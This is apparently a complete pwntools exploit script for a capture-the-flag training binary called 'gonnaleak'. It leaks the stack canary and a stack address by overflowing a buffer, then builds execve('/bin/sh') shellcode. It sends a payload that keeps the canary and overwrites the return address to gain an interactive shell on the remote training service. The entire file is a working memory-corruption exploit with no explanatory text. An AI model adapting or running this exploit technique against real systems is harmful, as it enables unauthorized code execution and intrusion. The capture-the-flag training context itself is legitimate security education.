from pwn import *
import time
from socket import htonl


context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    r = process("./gonnaleak")
    gdb.attach(r, """
            b *0x4011d4
            #b *0x401224
            c
                  """)
    input("wait")
else:
    r = remote("bin.training.offdef.it", 2011)


context.arch = 'amd64'
stringa = b"/bin/sh"

######################### LEAKING CANARY #########################

print("1:", r.recv())
r.send(b"B"*105)
r.recvuntil(b"> ")
r.read(105)
leaked_canary = b"\x00" + r.read(7)
canary = u64(leaked_canary)
print("[!] leaked_canary %#x" % canary)

######################### LEAKING LIBC #########################

r.send(b"A"*152)
r.recvuntil(b"> ")
r.read(152)
leaked_address = r.read(6) + b"\x00\x00"
addr = u64(leaked_address)
print("leaked addr %#x" % addr)

myAddr = "0x00007fff9c8cd598"  # leaked in locale
mybuff = "0x7fff9c8cd410"  # start of buffer in locale

myAddr_dec = int(myAddr, 16)
mybuff_dec = int(mybuff, 16)

programOff = myAddr_dec - mybuff_dec

whereToJump = mybuff_dec + programOff + 1
whereToJump_hex = hex(whereToJump)
print("Where to jump %#x" % whereToJump)
whereToJump_hex_little = whereToJump.to_bytes(8, byteorder='little')
print("Where to jump hex little %s" % whereToJump_hex_little)


shellcode = """
mov rax, 0x3b
xor rsi, rsi
xor rdx, rdx
mov rdi, """ + str(whereToJump) + """
add rdi, 0x1a
syscall
"""

assembled = asm(shellcode)
assembled = assembled + stringa + b"\x00"

payload = b"A"*3 + assembled + b"A" * \
    (103-len(assembled)) + leaked_canary + b"B"*8 + whereToJump_hex_little
r.send(payload)

# 0x00007ffff7c29d90 leaked in locale
# 0x00007fffffffde72 start of buffer in locale


time.sleep(0.5)

r.sendline(b"")

r.interactive()
